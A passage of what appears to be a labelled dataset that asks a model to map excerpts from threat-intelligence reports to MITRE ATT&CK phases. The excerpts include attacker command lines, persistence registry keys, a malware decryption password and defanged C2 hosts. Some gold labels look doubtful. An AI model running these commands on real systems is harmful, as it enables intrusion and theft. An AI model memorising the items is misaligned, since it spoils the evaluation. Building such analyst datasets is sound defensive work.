        "input": "Described attack activity: The malware can steal a variety of information, including files based on extensions and file name keywords: \n\\*.exe;\\*.ndb;\\*.mp3;\\*.avi;\\*.rar;\\*.docx;\\*.url;\\*.xlsx;\\*.pptx;\\*.ppsx;\\*.pst;\\*.ost;\\*psw\\*;\\*pass\\*; \\*login\\*;\\*admin\\*;\\*sifr\\*;\\*sifer\\*;\\*vpn;\\*.jpg;\\*.txt;\\*.lnk; \\*.dll;\\*.tmp;\\*.obj;\\*.ocx;\\*.js \nNote: we believe the \"\\*sifr\\*\" and \"\\*sifer\\*\" keywords above refer to the transliteration of the English word \"Cypher\" in some languages. \nAlso, the backdoor has many other capabilities including: \nKeylogger   \nSkype password stealer   \nGeneral network information harvester   \nScreen grabber (grabs images every 5 minutes)   \nClipboard grabber (grabs clipboard contents every 30 seconds)   \nMicrosoft Outlook, Windows Address Book stealer   \nGoogle Chrome password stealer   \nGoogle Talk password stealer   \nOpera password stealer   \nTheBat! password stealer   \nFirefox, Thunderbird password stealer   \nDrives/location/locale/installed software harvester   \nWiFi network/adapter information harvester   \nLSA secrets harvester   \nProtected Storage secrets harvester   \nCertificate/private keys exporter   \nURL History harvester \nInteliForms secrets harvester \nIE Autocomplete, Outlook Express secrets harvester and more... ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The top observed means of gaining initial access was tied between using compromised credentials on valid accounts and exploiting public-facing applications, each accounting for 28 percent of engagements, closely followed by phishing. In the phishing engagements this quarter, Talos IR observed a mix of malicious links and QR codes leading to fake login sites crafted to steal credentials. \nExploit in public-facing application was the top infection vector in Q4 ",
        "output": "initial access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The loader sends binary data through the named pipe to the orchestrator. This blob contains: \n\u2022 a command ID (2): CMC_TAKE_LOADER_BODY   \n\u2022 the loader path file   \n\u2022 the loader PE \nOnce this message is received by the orchestrator, the loader is securely deleted by overwriting the file content and deleted through the DeleteFile function. \nAfterwards, the persistency is set up. The persistency information is retrieved from the resource \"105\" and stored in the Gazer storage. Among these data, there is a dword value that is used to choose which persistency mode will be applied. \nThe resource 105 is structured in the following way: \n\u2022 a dword value representing the persistence mode \u2022 a dword value representing the size of the data \u2022 the persistence information \nThere are 6 different persistence modes. \n0: ShellAutorun \nPersistence is achieved through the Windows registry by setting the value \"Shell\" with \"explorer. exe, %malware_pathfile%\" under the following key: \nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon ",
        "output": "persistence",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Analysis of the encoded HTA file revealed that a file named textboxNameNamespace.jpg was downloaded fromhttp://povertyboring2020b[.]com.This file's extension is misleading as the file is a Windows DLL.\nThe HTA file is written to:\nThe HTA file when executed downloads a file named \"textboxNameNamespace.jpg\", which is actually an IcedID DLL file responsible for the first stage.\nThrough the same HTA file, the IcedID first stage DLL file is executed via regsvr32.exe.\nIcedID executes via rundll32, dropping DLL files related to both the IcedID second stage and Cobalt Strike beacons.\nAfter the initial compromise, the threat actors went silent for eleven days. After that period of time, a new Cobalt Strike beacon was run through IcedID and sent forth to a second phase of their activities.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1003 OS Credential Dumping   \nO T1003.001 LSASS Memory   \nC T1003.002 Security Account Manager   \nC T1003.003 NTDS   \nO T1003.006 DCSync T1003.008 /etc/passwd and /etc/shadow ",
        "output": "credential access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Cybereason Nocturnus IR team observed multiple persistence techniques that were used by Winnti over the course of the intrusion. While some techniques are quite trivial and well-known, some persistence techniques are rare and advanced which only a handful of threat actors are known to have used before. ",
        "output": "persistence",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For lateral movement, the attackers used the Windows-native Schtasks command to create remote scheduled tasks, and to execute malicious code through the aforementioned batch files: \nSCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR<Path to aBatch File>/ST<Time>/RUSYSTEM \nThescheduledtaskcommandlineusedforlateralmovement \nThe scheduled tasks the attackers have created were created with the name test, using compromised Domain Administrator credentials. The batch file the scheduled task executed was executed from a temp folder using the local SYSTEM account. \nBy clicking \"Accept All Cookies\", you agree to the storing of cookies on your device to enhance site navigation, analyze site usage, and assist in our marketing efforts. ",
        "output": "lateral movement",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Over the last year, we have witnessed numerous intrusions where malware variants such as Trickbot, Hancitor, Bazar, and IcedID have been utilized as an entry point for ransomware attacks. In the majority of the intrusions, the malware was distributed in the form of non-targeted phishing, such as mass malware spam campaigns.\nInitial Access Sources 2021.\nOur reports tend to focus on instances where phishing is the initial vector, as was the case in 16 of 20 reports. Although we still experience cases of threat actors compromising vulnerable web-facing applications, those cases do not always turn into a large-scale intrusion.. Our report onExchange Exploit Leads to Domain Wide Ransomware, was the only case where the threat actors actively sought to deploy ransomware after getting access through a vulnerable application. The other two cases (All that for a Coinminer?andWebLogic RCE Leads to XMRig) are a good representation of less impactful malicious activity, where the threat actors installed cryptominers. However, we believe that these intrusions can signal vulnerabilities that need immediate patching and remediation before being exploited by a threat actor seeking larger scale objectives.\nPhishing was the main initial access vector for our cases in 2021. The malware vectors we saw in 2021 were:\nTrickBot \nBazar \nIcedID \nHancitor\nThe below graphic displays the tools/methods used by threat actors after getting initial access via the initial access malware listed above.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Emansrepo has been active since at least last November, and the attack method is continuously evolving. The attack vectors and malware are ever-changing and pervasive, so it's vital for organizations to maintain cybersecurity awareness. FortiGuard will continue monitoring these attack campaigns and providing appropriate protections as required.",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Analyst's comment: These indicators should not be considered exhaustive for this observed activity. Moreover, aside from the malicious DLLs, Microsoft researchers have observed two files in October 2019 with code anomalies when a class was added to the SolarWinds DLL. Note however that these two do not have active malicious code or methods. ",
        "output": "command and control",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: From the initial access, a scheduled task was created. This can be observed by EventID 106: New task registered:\nInspection of the task file located under 'c:\\windows\\system32\\tasks':\n'License.dat' is an encrypted binary file and is a tell-tale indication of an IcedID compromise. The corresponding DLL (upefkuin4.dll) is used with license.dat to maintain persistence using the Task Scheduler. After decrypting License.dat using Binary Defense'sdecryption tool, we can see some information stealing functionality:\nEventID 200: Task executed shows the persistent IcedID core being executed, on average every 1 hour via Rundll32.exe.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon execution of the packed SFX RAR, it installs the Remote Utilities executable. The Remote Utilities executable reaches out to preconfigured C&Cs iteratively over TCP: \n111.90.151.182:5651   \n111.90.151.182:8080   \n111.90.151.182:5555   \n111.90.151.182:4899 \nRemote Utilities is not malicious by itself but can be used maliciously by threat actors. The utility can enable a threat actor to: \nDownload and upload files to a C&C Remotely execute files Set persistence through a startup service ",
        "output": "execution",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cadet Blizzard predominantly achieves initial access through exploitation of web servers commonly found on network perimeters and DMZs. Cadet Blizzard is also known for exploiting Confluence servers through the CVE-2021-26084 vulnerability, Exchange servers through multiple vulnerabilities including CVE-2022-41040 and ProxyShell, and likely commodity vulnerabilities in various open-source platforms such as content management systems. ",
        "output": "initial access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the initial access credentials were obtained via a brute-force attack against the exposed MSSQL server. No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Emotet malware has used various persistence methods over time, an example can be seenhere.\nOn the first day, Emotet established persistence via a run key.\nAs we can see, theregsvr32.exeWindows's native utility was used to launch the Emotet DLL.\nAfter moving to the hands on keyboard phase of the intrusion, the threat actors proceeded to deploy several remote management tools across the environment.Tactical RMMwas the first tool chosen for deployment. Tactical RMM is a remote management software platform that uses a combination of agents to allow for remote management and access to systems.\nThe file17jun.exe,was deployed into the programdata folder on one of the servers. This was then executed by the threat actors and resulted in the installation of the main RMM agent. The install completed with the following command.\nA service was also created for the agent.\nAlong with thetacticalrmm.execlient, a second executable calledmeshagent.exe,was installed to handle remote session interaction, and a separate service was created for that agent.\nOn the final day of the intrusion, the threat actors added AnyDesk to the same server running Tactical RMM, providing an additional means of access prior to the deployment of ransomware.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Across the compromised endpoints where a Cobalt Strike beacon was deployed, the LSASS process was accessed to retrieve in memory credentials.\nSuspicious CallTrace with 'UNKNOWN' indicates injected code, whilst the Granted Access 0x1010 is a standard behavior from credential stealing tools such as mimikatz. The code 0x1010 can be broken down to the below access rights:\n0x00000010 = VMRead \n0x00001000 = QueryLimitedInfo\nThe operator spent some time accessing and viewing files. File that were of the most interest were those that could indicate credentials storage. In this intrusion 'Notepad' was used to view a file within a Passwords file share location.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Discovery plays a critical role for the threat actor in assessing the environment they have infiltrated. Throughout the intrusion, the attacker conducted discovery activities across multiple systems, gathering valuable intelligence on the network and its assets.\nHands On Keyboard\nDiscovery began on the beachhead host approximately six hours after initial access. The first command executed was \"systeminfo,\" aimed at gathering details about the local system. Shortly after, the command \"nltest /dclist\" was issued to identify the domain controllers within the environment.\nSysmon eventID 1 shows evidence of running the commands:\nSharphound\nOnce the threat actor identified the domain controllers, they wasted no time and promptly loaded Sharphound into memory via Cobalt Strike. This allowed them to conduct further discovery activities within the environment, expanding their reconnaissance efforts.\nWe have some proof showing mstsc.exe loading Sharphound as a CLR(Common Language Runtime) module. mstsc.exe is the child process of Cobalt Strike beacon RtWin64.exe. The below screenshot taken from the EDR telemetry depicts that:\nOutput from Sharphound was stored in \"C:\\Windows\\Temp\\Dogi\\\". The recurring use of this directory aligns with behaviors documented in a different report,BazarCall to Conti Ransomware chain. This suggests a potential operational signature or TTP (Tactics, Techniques, and Procedures) common to this threat actor group or its operators. Based on the output files created, `it looks like it was run in default mode as described below.\nSysmon eventID 11 showing the files created:\nSharphound appeared to be running in its default mode, which involves enumerating local group memberships by querying the Windows Security Accounts Manager (SAM) database remotely through the samr pipe on the target host. This pipe is exposed via the IPC$ share, and corresponding activity can be detected by monitoring Windows security events with event ID 5145. A similar approach is used to discover logged-on users; however, in this case, Sharphound communicates with the srvsvc pipe, utilizing the Server Service Remote Protocol.\nWindows eventlog eventID 5145 showing Sharphound enumeration activity:\nWhen Sharphound enumerates the Active Directory through LDAP searches, it performs an excess amount of queries.\nExample of Sharphound LDAP searches:\nSharphound executed in memory by Cobalt Strike, performing LDAP queries:\nSharphound was initially executed on the beachhead host. Later in the intrusion, the threat actor ran Sharphound two more times, this time on a domain controller. The output from the first run was saved to \"C:\\Windows\\System32\\\", while the second run's results were directed to \"C:\\Perflogs\\\".\nAgain Sysmon eventID 11 caught the files created by Sharphound:\nWindows Security eventID 4799 shows Sharphound performing discovery on local security-enabled groups:\nMore information on how Sharphound functions can be found here:\nMore ways to detect LDAP queries generally in this great article here:\nADFind\nADFind, a tool frequently used by threat actors, was also employed in this intrusion to conduct enumeration and discovery. After gaining access to the second domain controller, the threat actor created \"ADFind.exe\" and \"adf.bat\" in an attempt to gather further Active Directory information.\nSysmon eventID 11 showing creation of ADFind.exe and adf.bat by Cobalt Strike:\nA few seconds after creation of the files, the threat actor was eager to collect the desired information and executedadf.batviacmd.exe:\nNo additional commands were observed after each batch file execution. This indicates the operator may have encountered difficulties, as the batch file was executed twice within just over a minute of the initial attempt, suggesting potential issues or missteps during execution.\nSysmon eventID 11 shows the creation of the files with the output of ADFind:\nIt's possible that the files ended up being empty, causing the threat actor to reconsider their approach. About 15 minutes later, the operator tried running ADFind.exe directly from the command line, likely to verify whether the tool would execute properly.\nAfter failing to determine the cause of the issue, the threat actor stayed quiet until the next day. The operator likely made an error by trying to run \"adf.bat\" from \"C:\\Windows\\System32\\\" when both \"adf.bat\" and \"ADFind.exe\" were actually located in \"C:\\Perflogs\\adf\\\". Because of this, \"ADFind.exe\" probably couldn't be found as an executable in the wrong directory, leading to the error.\nAfter several days, the threat actor decided to give ADFind another try. This time, on the file server the operator was successful in runningadf.batcorrectly to findADFind.exeand perform the desired discovery activity:\nSysmon eventID 1 showing threat actor running adf.bat:\nResulting in several adfind.exe process events:\nGet-DataInfo.ps1\nThe threat actor also used a PowerShell script to enumerate local systems. Together with a batch script called \"start.bat\" the threat actor ranGet-DataInfo.ps1on both a domain controller and a different servers in the environment. We have seen this PowerShell script usedseveral times before. Interestingly, PowerShell was initiated using the start.bat file. However, the start.bat file did not work as intended and passed the \"method\" parameter to the Get-DataInfo.ps1 script, which is not recognized as a valid parameter. As a result, it ran in default mode. This behavior may have confused the operator at the keyboard, as well as the batch script that was run several times in a row on both servers.\nSysmon EventID 1 showsstart.batexecutesGet-DataInfo.ps1with parameter method:\nThe start.bat script tries to set a variable called method to the discovery method chosen by the user if the method is not typed on the command line:\nThe issue with the script arises from the fact that the variable \"method\" does not receive the user-chosen value until after the IF condition is complete. Additionally, the variable must be referenced as%method%to capture the user input correctly. This oversight explains why the PowerShell command initiatingGet-DataInfo.ps1includes \"method\" as a parameter on the command line:\nThe below will end up running the Get-DataInfo.ps1 script in default mode:\nThe default mode will run theTest-LHost,Get-DiskInfoandGet-Softwarefunctions in the script before calling the last function,Compress-Result:\nSysmon eventID 1 showing the execution:\nSysmon eventID 1 process create showing several runs of start.bat:\nWindows Utilities\nThe threat actor performed several discovery commands using various Windows utilities at various times during the intrusion.\nAdministrator Consoles\nOn the final day of the intrusion, the threat actor accessed the administrative consoles for both DNS and Group Policy. Shortly after, they proceeded to deploy ransomware across the environment.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This section outlines how the threat actors obtained credentials. To do so, APT41 uses several different, fairly popular techniques. ",
        "output": "credential access",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cobalt Strike beacons were deployed across several endpoints using remote service creation. Services were either created based on Powershell base64 encoded payloads or as a dropper executable.\nCobalt Strike beacon PowerShell payloads have recognizable indicators, including random service name, use of COMPSPEC, and PowerShell parameters. The Base64 encoding starting with JAB is a common indicator of variables being used.\nCompiled Cobalt Strike beacons were dropped onto Domain Controllers\nThis particular beacon was detected by the host AV [Windows Defender eventID 1117] and removed.\nCobalt Strike beacons distributed with SMB admin shares\nThe diagram below shows the distribution of Cobalt Strike beacons to hosts in the environment over SMB admin shares.\nWMI used to start remote process\nIn this intrusion, the \"reg add\" command was executed remotely through WMI to attempt to permit RDP connections by changing the \"DenyTSConnections\" key to false (0), as shown with the network traffic capture below.\nThe threat actor again executed a command to modify the registry key to enable Restricted Admin mode remotely via WMI. This activity was captured via Windows eventID 4688.\nRemote Desktop Protocol\nRDP was used to move laterally between several hosts. The diagram below shows the RDP connections made by the threat actor.\nWindows eventlog for RDP \"RemoteDesktopServices-RdpCoreTS/Operational\" eventID 131 shows RDP activity with details like client IP and source port.\nRemote Service creation with MSRPC\nThe threat actor utilized RPC to create services remotely. Using MSRPC Service Control Manager(SCM) is a known Cobalt Strike feature to execute code on remote hosts. Here the CreateWowService call is used to run PowerShell command to disable Windows Defender Real Time Monitoring. Adding the password or NTLM hash inwiresharkwill decrypt the traffic.\nHands On Keyboard\nUsing a compromised account, the threat actor was observed moving payloads between hosts using Notepad. The file they dropped the content into was aptly named 'payload.txt'.\nThe file payload.txt was captured on network share before the threat actor dropped the content into a text file with Notepad. The data contained both an encoded PowerShell command and several commands to disable functionality in windows defender.\nWe can see the threat actor then copied the data from Sysmon eventID 24, which also shows the threat actor hostname as DESKTOP-GRALDC5.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Volt Typhoon primarily relies on valid credentials for persistence [T1078]. \nDefense Evasion \nVolt Typhoon has strong operational security. Their actors primarily use LOTL for defense evasion [TA0005], which allows them to camouflage their malicious activity with typical system and network behavior, potentially circumventing simplistic endpoint security capabilities. For more information, see joint guide Identifying and Mitigating Living off the Land Techniques. \nVolt Typhoon actors also obfuscate their malware. In one confirmed compromise, Volt Typhoon obfuscated FRP client files (BrightmetricAgent.exe and SMSvcService.exe) and the commandline port scanning utility ScanLine by packing the files with Ultimate Packer for Executables (UPX) [T1027.002]. FRP client applications support encryption, compression, and easy token authentication and work across multiple protocols-including transmission control protocol (TCP), user datagram protocol (UDP), hypertext transfer protocol (HTTP), and hypertext transfer protocol secure (HTTPS). The FRP client applications use the Kuai connection protocol (KCP) for error-checked and anonymous data stream delivery over UDP, with packet-level encryption support. See Appendix C and CISA Malware Analysis Report (MAR)-10448362-1.v1 for more information. \nIn addition to LOTL and obfuscation techniques, Volt Typhoon actors have been observed selectively clearing Windows Event Logs [T1070.001], system logs, and other technical artifacts to remove evidence [T1070.009] of their intrusion activity and masquerading file names [T1036.005]. \nCredential Access \nVolt Typhoon actors first obtain credentials from public-facing appliances after gaining initial access by exploiting privilege escalation vulnerabilities [T1068] in the operating system or network services. \nIn some cases, they have obtained credentials insecurely stored on the appliance [T1552]. In one instance, where Volt Typhoon likely exploited CVE-2022-42475 in an unpatched Fortinet device, Volt Typhoon actors compromised a domain admin account stored inappropriately on the device. \nVolt Typhoon also consistently obtains valid credentials by extracting the Active Directory database file (NTDS.dit)-in some cases multiple times from the same victim over long periods [T1003.003]. NTDS.dit contains usernames, hashed passwords, and group memberships for all domain accounts, essentially allowing for full domain compromise if the hashes can be cracked offline. \nTo obtain NTDS.dit, the U.S. authoring agencies have observed Volt Typhoon: \n1. Move laterally [TA0008] to the domain controller via an interactive RDP session using a compromised account with domain administrator privileges [T1021.001];   \n2. Execute the Windows-native vssadmin [T1006] command to create a volume shadow copy;   \n3. Use Windows Management Instrumentation Console (WMIC) commands [T1047] to execute ntdsutil (a LOTL utility) to copy NTDS.dit and SYSTEM registry hive from the volume shadow copy; and   \n4. Exfiltrate [TA0010] NTDS.dit and SYSTEM registry hive to crack passwords offline) [T1110.002]. (For more details, including specific commands used, see Appendix A: Volt Typhoon LOTL Activity.) Note: A volume shadow copy contains a copy of all the files and folders that exist on the specified volume. Each volume shadow copy created on a DC includes its NTDS.dit and the SYSTEM registry hive, which provides keys to decrypt the NTDS.dit file. \nVolt Typhoon actors have also been observed interacting with a PuTTY application by enumerating existing stored sessions [T1012]. Given this interaction and the exposure of cleartext-stored proxy passwords used in remote administration, Volt Typhoon actors potentially had access to PuTTY profiles that allow access to critical systems (see the Lateral Movement section). \nAccording to industry reporting, Volt Typhoon actors attempted to dump credentials through LSASS (see Appendix B for commands used).[2] \nThe U.S. authoring agencies have observed Volt Typhoon actors leveraging Mimikatz to harvest credentials, and industry partners have observed Volt Typhoon leveraging Impacket.[2] \n\u2022 Mimikatz is a credential dumping tool and Volt Typhoon actors use it to obtain credentials. In one confirmed compromise, the Volt Typhoon used RDP to connect to a server and run Mimikatz after leveraging a compromised administrator account to deploy it. Impacket is an open source Python toolkit for programmatically constructing and manipulating network protocols. It contains tools for Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks-as well as remote service execution. \nDiscovery \nVolt Typhoon actors have been observed using commercial tools, LOTL utilities, and appliances already present on the system for system information [T1082], network service [T1046], group [T1069] and user [T1033] discovery. ",
        "output": "persistence",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Raspberry Robin first uses cmd.exe to read and execute a file stored on the infected external drive. The command is consistent across Raspberry Robin detections we have seen so far, making it reliable early evidence of potential Raspberry Robin activity. Typically the command line includes cmd /R < to read and execute a file. The use of cmd /R < is not unique to Raspberry Robin, but the filename pattern is unique. The filename is made up of five to seven random alphanumeric characters and a variety of file extensions. Some of the file extensions we've seen include .usb, ico, .lnk, .bin, .sv, and .lo. Additionally, the command has sometimes included type, which is a built-in command to display the contents of a file. \nHere's an example of what the whole command might look like: \nProcessspawned \nCommand Line:\"cmd.exe/r C:\\WINDowS\\system32\\cmd.exe<xjHfK.USb \nFigure 3: Raspberry Robin cmd.exe command \nNext, cmd.exe typically launches explorer.exe and msiexec.exe. With Raspberry Robin, explorer.exe's command line can be a mixedcase reference to an external device; a person's name, like LAUREN V; or the name of the .lnk file, like the figure below. The name here has been modified from the .lnk file name to LNkFILe. While we aren't sure of this command's exact purpose, we've consistently observed it in Raspberry Robin detections. \nProcessspawned bycmd.exe \nCommand Line: ExpLoRER \"USB Drive\" \nProcessspawnedbycmd.exe \nCommand Line: eXPLOReR LNkFILe \nFigure 4: Mixed-case command referring to device or name \nRaspberry Robin extensively uses mixed-case letters in its commands. Adversaries sometimes use mixed-case syntax in an attempt to evade detection. Case-sensitive, string-based detections written to detect evil may not fire on eViL, but cmd.exe is case-insensitive and has the flexibility to read and process both commands the same way. ",
        "output": "execution",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Talos IR discovered the fake browser updater executable is a Remote Access Tool (RAT) that automatically executes an embedded PowerShell script when downloaded and run. The script initially downloads a legitimate Chrome setup executable \"ChromeSetup.exe\" to the victim machine's applications temporary folder and established persistence by dropping a Windows shortcut file in the Windows StartUp folder with the file name \"fahhs.lnk\" configured to run the RAT every time the victim logs in, establishing persistence. \nSample PowerShell command that downloads the RAT. \nThe RAT executes the command \"cmd.exe /c systeminfo\" and collects information from victim machine, listed below: \nThen, the RAT encrypts the collected information in the memory stream. It establishes a secured socket to the command and control (C2) server hidden behind the attacker-controlled Cloudflare domain \"apple-online[.]shop\", sends the encrypted data stream of victim machine information to the C2 server, and waits to receive the response. \nThe RAT also allowed the attacker to execute two other PowerShell commands on the victim machine, which downloads the encrypted data blobs of a credential stealer \"cht.exe\" and a keylogger binary \"klg.dll\", decrypts them with the passwords \"jgSkhg934@kjv#1vkfg2S\" and runs them. We observed that the keylogger is a DLL file that is run using the LOLBin \"rundll32.exe\". ",
        "output": "execution",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attackers executed several familiar discovery commands on the targeted systems. These were related to the discovery of information on users, hosts and the network configuration. The threat actor connected via the NetSupport agent and then started running commands via a spawned instance ofcmd.exe\nBelow are the first batch of executed discovery commands observed. As seen during this entire intrusion, the threat actor makes small mistakes, either with typos or in command functionality:\nWe observed the threat actor quickly query for a specific account. This account is a local admin and a domain admin. However, this account was not activated and the actor tried to enable it, making a few mistakes along the way:\nWe observe a couple of mistakes, as a result of hands-on activity and struggling to get things working:\nThe firstcmdkeyis actually correct usage, however the account was not activated. \nUsing/addrequires the usage of domain credentials, not credentials of machine. \nAdding quotes to a command, where it does not matter.\nAfter this endeavor, the threat actor tried elsewhere, looking around for interesting information related to theSYSVOLshares. Additionally, the actor looked for the presence ofSSH. This was not installed on the system, so the threat actor installed their own SSH server, as can be seen under the PERSISTENCE section. Additionally, the threat actor tried his luck to find additional domain controllers:\nIn addition to the recognizableatexec.pycharacteristics, thisexcellent readexplains how to hunt foratexec.pyin the Windows event logs:\nResulted in:\nand three seconds later in:\nAfter this, wmiexec is observed:\nAfter theImpacketactivity, the threat actor returned later to a domain controller and a backup server, where additional tooling was used for discovery. The first wasPingCastle, an active directory auditing tool. On the domain controller, the threat actor executed the following commands:\nThe second one was theSoftPerfect Network Scanner. This utility is commonly used by threat actors. While a paid utility, many use the free trial version. However, during this intrusion, the actor clearly did not pay for its version, as they brought their own keygen. On the backup server, the threat actor executed the following commands:\nDuring the later stage of the intrusion, the threat actor dumped the event 4624 logs from a domain controller. These were written to the file mf.txt. This file was later added to a zip archive. The file was not looked at on the host it was dumped on. The dumping of these logs may have been to review user logon activity across the environment.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Gootloader employs several executions across the whole infection chain.\nThe JavaScript file was executed after the user double-clicked on it within the opened zip archive.\nExecution of the Javascript file drops another Javascript file named \"Frontline Management.js\". This dropped Javascript is heavily obfuscated.\nIn addition to the file, a new scheduled task named 'InfrSiRfucture Technologies' was created. This task was then invoked to run the new Javascript file. The infection chain continues with a PowerShell script. The execution chain here is Svchost.exe(Scheduled Task) \u279d Wscript.exe \u279d Cscript.exe \u279d Powershell.exe\nThe PowerShell script included URLs to ten remote servers:\nNot all the included remote servers were weaponized at the time of execution, so some servers answered with HTTP 405 \"Method Not Allowed\".\nFor the server that was weaponized, however, there is a different response. For this intrusion, that was 46.28.105[.]94 with the URL \"hxxp:blog[.]lilianpraskova[.]cz/xmlrpc[.]php\". The server then started answering with the HTTP status code 200 \"OK\" and delivering the final stage in the Gootloader infection.\nThe final download contained three different components. Gootloader stage1(prameter $cXqt) which was an obfuscated dll, Gootloader stage2(parameter $IbaY) which ended up as an exe file when deobfuscated. Finally, a script wrote stage1 and stage2 into the registry before deobfuscating stage1 and loading that into memory. Stage1 took care of the deobfuscation of stage2, the final payload for Gootloader, and loaded what we later will see is a Cobalt Strike Beacon.\nThe encoded PowerShell command that ran is beautified and decoded below.\nHere's the decoded value:\nDecoding the JavaScript stager payload manually could be time-consuming, so we usedthisfantastic script made by Mandiant. This is a collection of scripts used to deobfuscate Gootloader malware samples. We used theGootLoaderAutoJSDecode.pyPython script that automatically decodes .js files using static analysis.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In early February 2024, we identified a security breach originating from an exposed Windows server. The server was compromised through a Confluence remote code execution (RCE) vulnerability that was disclosed on January 16, 2024.\nConfluence RCE Exploitation\nThe threat actor initially gained access by exploiting a server-side template injection vulnerability (CVE-2023-22527, CVSS 10.0) in an exposed Atlassian Confluence server. This vulnerability allows an unauthenticated threat actor to execute arbitrary commands on the target server by injecting OGNL expressions. The exploitation started from the IP address 92[.]51.2.22 as shown by the following Suricata alert.\nThe first commands executed by the threat actor were net user and whoami. These were used to enumerate the user accounts on the compromised Windows server and to gather information about the currently affected user. Moreover, the exploitation was likely made through a Python script based on the user-agent used.\nThe vulnerability arises from improper handling of user-supplied input within certain template files in Confluence. Specifically, files like confluence/template/xhtml/pagelist.vm accept parameters that are passed to potentially dangerous functions without sufficient sanitization. For instance, the $stack.findValue function can be manipulated to inject malicious Object-Graph Navigation Language (OGNL) expressions, leading to arbitrary code execution. Threat actors can exploit this vulnerability by sending crafted HTTP POST requests to specific endpoints, such as /template/aui/text-inline.vm, with malicious payloads in the parameters. Additional details about the vulnerability can be found in those reports:Trend MicroandSplunk.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
